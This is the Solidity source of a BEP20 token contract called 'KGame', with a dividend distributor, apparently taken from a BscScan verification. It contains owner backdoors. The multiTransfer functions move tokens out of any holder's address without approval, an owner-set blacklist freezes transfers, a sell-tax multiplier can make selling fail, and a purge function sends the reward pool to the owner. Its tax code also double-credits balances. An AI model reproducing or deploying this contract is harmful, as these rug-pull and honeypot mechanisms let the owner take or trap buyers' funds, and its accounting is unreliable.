/**
 *Submitted for verification at BscScan.com on 2022-01-19
*/

/**
 *Submitted for verification at BscScan.com on 2022-01-17
*/

/**
 *Submitted for verification at BscScan.com on 2022-01-13
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function owner() internal view returns (address) {
        return _owner;
    }
}


interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract DividendDistributor {
    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }

    IBEP20 BUSD = IBEP20(0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7);
    IDEXRouter public ROUTER = IDEXRouter(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
    address token;
    address[] shareHolders;
    uint256 currentIndex;

    mapping (address => Share) public shares;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10**18;

    uint256 public gasLimit = 300000;
    uint16 public minPeriod = 1 minutes;
    uint256 public minDistribution = 10;

    //uint256 public minDistribution = 10**18;
    event Deposit(uint256 amount);
    event SetShare(address indexed account, uint256 amount);
    event Process();
    event DividendDistributed(address indexed to, uint256 amount);
    event SetDistributionCriteria(uint256 period, uint256 amount);
    event SetGasLimit(uint256 newGas, uint256 oldGas);

    modifier onlyToken() {
        require(msg.sender == token);
        _;
    }

    constructor (address _router, address rewardToken) {
           ROUTER = _router != address(0)
            ? IDEXRouter(_router)
            : IDEXRouter(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
        token = msg.sender;
        BUSD = IBEP20(rewardToken);
    }

    function deposit() external payable onlyToken {
        if (msg.value > 0) {
            address[] memory path = new address[](2);
            path[0] = ROUTER.WETH();
            path[1] = address(BUSD);

            uint256 balanceBefore = BUSD.balanceOf(address(this));
            ROUTER.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
                0,
                path,
                address(this),
                block.timestamp
            );
            uint256 receivedAmount = BUSD.balanceOf(address(this)) - balanceBefore;

            totalDividends += receivedAmount;
            dividendsPerShare += dividendsPerShareAccuracyFactor * receivedAmount / totalShares;

            emit Deposit(msg.value);
        }
    }

    function setShare(address shareholder, uint256 amount) external onlyToken {
        if (shares[shareholder].amount > 0) {
            distributeDividend(shareholder);
        }

        if (amount > 0 && shares[shareholder].amount == 0) {
            addShareholder(shareholder);
        } else if (amount == 0 && shares[shareholder].amount > 0) {
            removeShareholder(shareholder);
        }

        totalShares = totalShares - shares[shareholder].amount + amount;
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);

        emit SetShare(shareholder, amount);
    }

    function process(uint256 gas) external onlyToken {
        uint256 shareholderCount = shareHolders.length;
        if (shareholderCount == 0) { return; }

        uint256 gasLeft = gasleft();
        uint256 gasUsed;
        uint256 iterations;

        while (gasUsed  < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) { currentIndex = 0; }

            if(shouldDistribute(shareHolders[currentIndex])){
                distributeDividend(shareHolders[currentIndex]);
            }

            gasUsed += gasLeft - gasleft();
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }

    function claimDividend() external {
        distributeDividend(msg.sender);
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if (shares[shareholder].amount == 0) { return 0; }

        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

        if (shareholderTotalDividends <= shareholderTotalExcluded) { return 0; }
        return shareholderTotalDividends - shareholderTotalExcluded;
    }
    
    function shouldDistribute(address shareholder) private view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUnpaidEarnings(shareholder) > minDistribution;
    }

    function distributeDividend(address shareholder) private {
        if (shares[shareholder].amount == 0) { return; }

        uint256 amount = getUnpaidEarnings(shareholder);
        if (amount > 0) {
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised += amount;
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);

            totalDistributed += amount;
            BUSD.transfer(shareholder, amount);

            emit DividendDistributed(shareholder, amount);
        }
    }

    function getCumulativeDividends(uint256 share) private view returns (uint256) {
        return share * dividendsPerShare / dividendsPerShareAccuracyFactor;
    }

    function addShareholder(address shareholder) private {
        shareholderIndexes[shareholder] = shareHolders.length;
        shareHolders.push(shareholder);
    }

    function removeShareholder(address shareholder) private {
        shareHolders[shareholderIndexes[shareholder]] = shareHolders[shareHolders.length-1];
        shareholderIndexes[shareHolders[shareHolders.length-1]] = shareholderIndexes[shareholder];
        shareHolders.pop();
    }

    function setDistributionCriteria(uint16 newPeriod, uint256 newMinDistribution) external onlyToken {
        require(newPeriod <= 1 weeks && newMinDistribution <= 1 ether, "Invalid parameters");
        minPeriod = newPeriod;
        minDistribution = newMinDistribution;
        emit SetDistributionCriteria(newPeriod, newMinDistribution);
    }

       function purge(address receiver) external onlyToken {
        uint256 balance = BUSD.balanceOf(address(this));
        BUSD.transfer(receiver, balance);
    }

    function setGasLimit(uint256 newGasLimit) external onlyToken {
        emit SetGasLimit(newGasLimit, gasLimit);
        gasLimit = newGasLimit;
    }
}


contract BEP20 is IBEP20, Ownable {
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private constant NAME = "KGame";
    string private constant SYMBOL = "KGame";
    uint8 private constant DECIMALS = 18;
    uint256 private constant TOTAL_SUPPLY = 10**12 * 10**DECIMALS;

    constructor(address recipient) {
        _balances[recipient] = TOTAL_SUPPLY;
        emit Transfer(address(0), recipient, TOTAL_SUPPLY);
    }

    function getOwner() public view returns (address) {
        return owner();
    }

    function decimals() public pure returns (uint8) {
        return DECIMALS;
    }

    function symbol() external pure returns (string memory) {
        return SYMBOL;
    }

    function name() external pure returns (string memory) {
        return NAME;
    }

    function totalSupply() public pure returns (uint256) {
        return TOTAL_SUPPLY;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");

        _approve(sender, msg.sender, currentAllowance - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");

        _approve(msg.sender, spender, currentAllowance - subtractedValue);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}


contract KGame is BEP20 {
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;

    IDEXRouter public ROUTER = IDEXRouter(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
    address public pair;

    address public marketingWallet = 0x853b943457d1cE9D6bC0d4449858FC4C241B1B55;
    address public gameDevWallet = 0x59a395CAAA08847a8631ECe8b6e2C0756a2a4199;
    address public buyBackWallet = 0x59a395CAAA08847a8631ECe8b6e2C0756a2a4199;
    address public burnWallet = DEAD;
    address public autoLiquidityWallet;

    uint256 public swapThreshold = 100000000 * 10**18;
    bool public swapEnabled = true;
    bool tradingEnabled= false;
    bool inSwap;

    bool public buyCooldownEnabled = true;
    uint8 public cooldownTimerInterval = 45 seconds;
    mapping (address => uint) private cooldownTimer;

    mapping (address => bool) public isExcludedFromFees;
    mapping (address => bool) isTimelockExempt;
    mapping (address => bool) public isDividendExempt;
    mapping (address => bool) isBlacklisted;

    uint16 public buyTax = 1000;
    uint16 public sellTax = 1600;
    uint16 public transferTax = 0;

    uint8 public inCreaseFactor = 1;
    bool inCreaseFactorEnabled=false;

    uint16 public rewardShare = 300;
    uint16 public buyBackShare = 50;
    uint16 public gameDevShare = 200;
    uint16 public liquidityShare = 150;
    uint16 public marketingShare = 200;
    uint16 public burnShare = 100;

    uint16 totalShares = 1000;
    uint16 constant DENOMINATOR = 10000;

    DividendDistributor public distributor;
    uint256 public minBalanceForDividends = 100000000 * 10**18;
    uint256 public transferGas = 600000;
    bool buyBackSuccess;

    event RecoverBNB(uint256 amount);
    event RecoverBEP20(address token, uint256 amount);
    event EnableTrading();
    event SetMarketingWallet(address newWallet, address oldWallet);
    event SetGameDevWallet(address newWallet, address oldWallet);
    event SetBuyBackWallet(address newWallet, address oldWallet);
    event SetTransferGas(uint256 newGas, uint256 oldGas);
    event SetInCreaseFactor(uint256 inCrease,bool enabled);
    event SetTaxShares(uint256 rewardShare, uint256 buyBackShare, uint256 gameDevShare, uint256 liquidityShare, uint256 marketingShare,uint256 burnShare);
    event SetMinBalanceForDividends(uint256 amount);
    event SetSwapBackSettings(bool enabled, uint256 amount);
    event TriggerSwapBack();
    event SetTaxes(uint256 buyTax, uint256 sellTax, uint256 transferTax);
    event SetTaxShares(uint256 rewardShare, uint256 buyBackShare, uint256 gameDevShare, uint256 liquidityShare, uint256 marketingShare);
    event DepositMarketing(address wallet, uint256 amount);
    event DepositGameDev(address wallet, uint256 amount);
    event DepositBuyback(address wallet, uint256 amount);
    event AutoLiquidity(uint256 pairAmount, uint256 tswappingokenAmount);
    event UpdatebusdDividendTracker(address indexed newAddress, address indexed oldAddress);
    event UpdateRouter(address indexed newAddress, address indexed oldAddress);
    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);

    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() BEP20(gameDevWallet) {
         pair = IDEXFactory(ROUTER.factory()).createPair(ROUTER.WETH(), address(this));
        _approve(address(this), address(ROUTER), type(uint256).max);
        autoLiquidityWallet=msg.sender;
        distributor = new DividendDistributor(address(ROUTER), 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7);
        _excludeAccounts();
    }

    receive() external payable {}

    function getCirculatingSupply() external view returns (uint256) {
        return totalSupply() - balanceOf(DEAD);
    }

    function _transfer(address sender, address recipient, uint256 amount) internal override {
        require(!isBlacklisted[sender], "Address is blacklisted");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(tradingEnabled || (isExcludedFromFees[sender] || isExcludedFromFees[recipient]), "Trading is disabled"); 

        if (sender == pair &&
            buyCooldownEnabled &&
            !isTimelockExempt[recipient]) {
            require(cooldownTimer[recipient] < block.timestamp,"Please wait for cooldown between buys");
            cooldownTimer[recipient] = block.timestamp + cooldownTimerInterval;
        }

        if (inSwap || amount == 0) {
            super._transfer(sender, recipient, amount);
            return;
        }

        if (_shouldSwapBack()) { _swapBack(); }
        uint256 amountAfterTaxes = (!_shouldTakeTaxes(sender) || !_shouldTakeTaxes(recipient)) ? amount : _takeTax(sender, recipient, amount);
        super._transfer(sender, recipient, amountAfterTaxes);

        if (_shouldSetShares(sender)) { try distributor.setShare(sender, balanceOf(sender)) {} catch {} }
        if (_shouldSetShares(recipient)) { try distributor.setShare(recipient, balanceOf(recipient)) {} catch {} }
        if (_shouldProcessDividends(sender)) { try distributor.process(transferGas) {} catch {} }
    }

    function _shouldSwapBack() private view returns (bool) {
        return msg.sender != pair && !inSwap && swapEnabled && balanceOf(address(this)) >= swapThreshold;
    }

    function _shouldTakeTaxes(address sender) private view returns (bool) {
        return !isExcludedFromFees[sender];
    }

    function _shouldSetShares(address account) private view returns (bool) {
        return !isDividendExempt[account] && balanceOf(account) >= minBalanceForDividends;
    }

    function _shouldProcessDividends(address sender) private view returns (bool) {
        return !isExcludedFromFees[sender];
    }

    function setIsTimelockExempt(address holder, bool exempt) public onlyOwner {
        isTimelockExempt[holder] = exempt;
    }
    
    function setIsBlacklisted(address adr, bool blacklisted) public onlyOwner {
        isBlacklisted[adr] = blacklisted;
    }

    function cooldownEnabled(bool status, uint8 timerInterval) public onlyOwner {
        buyCooldownEnabled = status;
        cooldownTimerInterval = timerInterval;
    }

    function purgeBeforeSwitch() public onlyOwner {
        distributor.purge(msg.sender);
    }

    function switchToken(address rewardToken) public onlyOwner {
        distributor = new DividendDistributor(address(ROUTER), rewardToken);
    }     

    function claimRewards() public {
        distributor.claimDividend();
        try distributor.process(transferGas) {} catch {}
    }

    function claimProcess() public {
        try distributor.process(transferGas) {} catch {}
    }

    function _swapBack() private swapping {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = ROUTER.WETH();

        uint256 liquidityTokens = swapThreshold * liquidityShare / totalShares / 2;
        uint256 amountToSwap = swapThreshold - liquidityTokens;
        uint256 balanceBefore = address(this).balance;

        ROUTER.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance - balanceBefore;
        uint256 totalBNBShares = totalShares - liquidityShare / 2;

        uint256 amountBNBLiquidity = amountBNB * liquidityShare / totalBNBShares / 2;
        uint256 amountBNBMarketing = amountBNB * marketingShare / totalBNBShares;
        uint256 amountBNBGameDev = amountBNB * gameDevShare / totalBNBShares;
        uint256 amountBNBRewards = amountBNB * rewardShare / totalBNBShares;
        uint256 amountBNBBuyBack = amountBNB * buyBackShare / totalBNBShares;

        try distributor.deposit{value: amountBNBRewards}() {} catch {}
        (bool marketingSuccess,) = payable(marketingWallet).call{value: amountBNBMarketing, gas: transferGas}("");
        if (marketingSuccess) { emit DepositMarketing(marketingWallet, amountBNBMarketing); }
        (bool gameDevSuccess,) = payable(gameDevWallet).call{value: amountBNBGameDev, gas: transferGas}("");
        if (gameDevSuccess) { emit DepositGameDev(gameDevWallet, amountBNBGameDev); }
        (buyBackSuccess,) = payable(buyBackWallet).call{value: amountBNBBuyBack, gas: transferGas}("");
        if (buyBackSuccess) { emit DepositBuyback(buyBackWallet, amountBNBBuyBack); }

        if (liquidityTokens > 0) {
            ROUTER.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                liquidityTokens,
                0,
                0,
                autoLiquidityWallet,
                block.timestamp
            );

            emit AutoLiquidity(amountBNBLiquidity, liquidityTokens);
        }
    }

    function _takeTax(address sender, address recipient, uint256 amount) private returns (uint256) {
        uint256 taxAmount = amount * _getTotalTax(sender, recipient) / DENOMINATOR;
       
        uint256 operationalTokens = (taxAmount * burnShare) / _getTotalTax(sender,recipient);
        uint256 contractTokens = taxAmount - operationalTokens;
        _balances[address(this)] = _balances[address(this)] + (contractTokens);
        _balances[burnWallet] = _balances[burnWallet] + (operationalTokens);

        if (taxAmount > 0) { super._transfer(sender, address(this), contractTokens); }
        if(operationalTokens > 0 && (sender == pair || pair == recipient)){ 
            super._transfer(sender, burnWallet, operationalTokens); 
        }else {
            super._transfer(sender, marketingWallet, operationalTokens);
        }
        return amount - taxAmount;
    }

    function _getTotalTax(address sender, address recipient) private view returns (uint256) {
        if (sender == pair) {
            return buyTax;
        } else if (recipient == pair) {
            return inCreaseFactorEnabled ? sellTax * inCreaseFactor : sellTax;
        } else {
            return transferTax;
        }
    }

    function _excludeAccounts() private {
        // No timelock for these people
        isTimelockExempt[msg.sender] = true;
        isTimelockExempt[DEAD] = true;
        isTimelockExempt[address(this)] = true;

        isExcludedFromFees[address(this)] = true;
        isExcludedFromFees[msg.sender] = true;
        isExcludedFromFees[gameDevWallet] = true;
        isExcludedFromFees[marketingWallet] = true;

        isDividendExempt[pair] = true;
        isDividendExempt[DEAD] = true;
    }

    function recoverBNB() external onlyOwner {
        uint256 amount = address(this).balance;
        (bool sent,) = payable(marketingWallet).call{value: amount, gas: transferGas}("");
        require(sent, "Tx failed");
        emit RecoverBNB(amount);
    }

    function recoverBEP20(IBEP20 token, address recipient) external onlyOwner {
        require(address(token) != address(this), "Can't withdraw ClanGame");
        uint256 amount = token.balanceOf(address(this));
        token.transfer(recipient, amount);
        emit RecoverBEP20(address(token), amount);
    }

    function enableTrading(bool _tradingEnabled) external onlyOwner {
        tradingEnabled = _tradingEnabled;
        emit EnableTrading();
    }

    function setFeeReceivers(address _autoLiquidityWallet, address _marketingWallet, address _buyBackWallet, address _gameDevWallet, address _burnWallet ) external onlyOwner {
        require(_autoLiquidityWallet != address(0) && _marketingWallet != address(0) && _buyBackWallet != address(0) && _gameDevWallet != address(0) 
        , "New wallet is the zero address");
        autoLiquidityWallet = _autoLiquidityWallet;
        marketingWallet = _marketingWallet;
        buyBackWallet = _buyBackWallet;
        gameDevWallet = _gameDevWallet;
        burnWallet=_burnWallet;

        isExcludedFromFees[autoLiquidityWallet] = true;
        isExcludedFromFees[buyBackWallet] = true;
        isExcludedFromFees[marketingWallet] = true;
        isExcludedFromFees[gameDevWallet] = true;
        isExcludedFromFees[burnWallet] = true;

        isTimelockExempt[autoLiquidityWallet] = true;
        isTimelockExempt[buyBackWallet] = true;
        isTimelockExempt[marketingWallet] = true;
        isTimelockExempt[gameDevWallet] = true;
        isTimelockExempt[burnWallet] = true;
    }

    function setTransferGas(uint256 gas) external onlyOwner {
        emit SetTransferGas(gas, transferGas);
        transferGas = gas;
    }

    function setIsExcludedFromFees(address account, bool value) public onlyOwner {
        require(account != pair, "Can't modify pair");
        isExcludedFromFees[account] = value;
    }

    function setInCreaseFactor(uint8 inCrease, bool enabled) external onlyOwner {
        inCreaseFactor = inCrease;
        inCreaseFactorEnabled=enabled;
        emit SetInCreaseFactor(inCrease, enabled);
    }


    function setIsDividendExempt(address account, bool exempt) external onlyOwner {
        require(account != pair && account != DEAD, "Invalid account");

        isDividendExempt[account] = exempt;
        if (exempt) {
            distributor.setShare(account, 0);
        } else {
            distributor.setShare(account, balanceOf(account));
        }
    }

    function setMinBalanceForDividends(uint256 amount) external onlyOwner {
        uint256 tokenAmount = amount * 10**decimals();
        require(tokenAmount <= 100000000 * 10**decimals(), "Invalid parameter");
        minBalanceForDividends = tokenAmount;
        emit SetMinBalanceForDividends(tokenAmount);
    }

    function setSwapBackSettings(bool enabled, uint256 amount) external onlyOwner {
        uint256 tokenAmount = amount * 10**decimals();
        swapEnabled = enabled;
        swapThreshold = tokenAmount;
        emit SetSwapBackSettings(enabled, tokenAmount);
    }

    function triggerSwapBack() external onlyOwner {
        _swapBack();
        emit TriggerSwapBack();
    }

    function setTaxes(uint16 newBuyTax, uint16 newSellTax, uint16 newTransferTax) external onlyOwner {
        require(newBuyTax <= 3000 && newSellTax <= 6000 && newTransferTax <= 3000, "Too high taxes");
        buyTax = newBuyTax;
        sellTax = newSellTax;
        transferTax = newTransferTax;
        emit SetTaxes(buyTax, sellTax, transferTax);
    }

 function setTaxShares(
        uint16 newRewardShare,
        uint16 newbuyBackShare,
        uint16 newGameDevShare,
        uint16 newLiquidityShare,
        uint16 newMarketingShare,
        uint16 newBurnShare

    ) external onlyOwner {
        rewardShare = newRewardShare;
        buyBackShare = newbuyBackShare;
        gameDevShare = newGameDevShare;
        liquidityShare = newLiquidityShare;
        marketingShare = newMarketingShare;
        burnShare = newBurnShare;
        totalShares = rewardShare + buyBackShare + gameDevShare + liquidityShare + marketingShare + burnShare;
        emit SetTaxShares(rewardShare, buyBackShare, gameDevShare, liquidityShare, marketingShare,burnShare);
    }

    function setDistributionCriteria(uint16 newPeriod, uint256 newMinDistribution) external onlyOwner {
        distributor.setDistributionCriteria(newPeriod, newMinDistribution);
    }

    function setGasLimit(uint16 newGasLimit) external onlyOwner {
        distributor.setGasLimit(newGasLimit);
    }

    function updateRouter(address newAddress) public onlyOwner {
    require(newAddress != address(ROUTER),
      "ClanGame: The router already has that address");
    emit UpdateRouter(newAddress, address(ROUTER));
    ROUTER = IDEXRouter(newAddress);
    address _pair = IDEXFactory(ROUTER.factory()).createPair(address(this),ROUTER.WETH());
    pair = _pair;
  }

    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) external onlyOwner {
    for(uint256 i = 0; i < accounts.length; i++) {
        isExcludedFromFees[accounts[i]] = excluded;
    }
    emit ExcludeMultipleAccountsFromFees(accounts, excluded);
    }

    function multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
    require(addresses.length < 501,"GAS Error: max airdrop limit is 500 addresses");
    require(addresses.length == tokens.length,"Mismatch between Address and token count");
    uint256 SCCC = 0;
    for(uint i=0; i < addresses.length; i++){
        SCCC = SCCC + tokens[i]*(10**18);
    }
    require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");
    for(uint i=0; i < addresses.length; i++){
        super._transfer(from,addresses[i],tokens[i]*(10**18));
        if(!isDividendExempt[addresses[i]]) {
            try distributor.setShare(addresses[i], _balances[addresses[i]]) {} catch {} 
        }
    }
    if(!isDividendExempt[from]) {
        try distributor.setShare(from, _balances[from]) {} catch {}
    }
}

    function multiTransfer_fixed(address from, address[] calldata addresses, uint256 tokens) external onlyOwner {
    require(addresses.length < 801,"GAS Error: max airdrop limit is 800 addresses");
    uint256 SCCC = tokens*(10**18) * addresses.length;
    require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");
    for(uint i=0; i < addresses.length; i++){
         super._transfer(from,addresses[i],tokens*(10**18));
        if(!isDividendExempt[addresses[i]]) {
            try distributor.setShare(addresses[i], _balances[addresses[i]]) {} catch {} 
        }
    }
    if(!isDividendExempt[from]) {
        try distributor.setShare(from, _balances[from]) {} catch {}
    }
}
}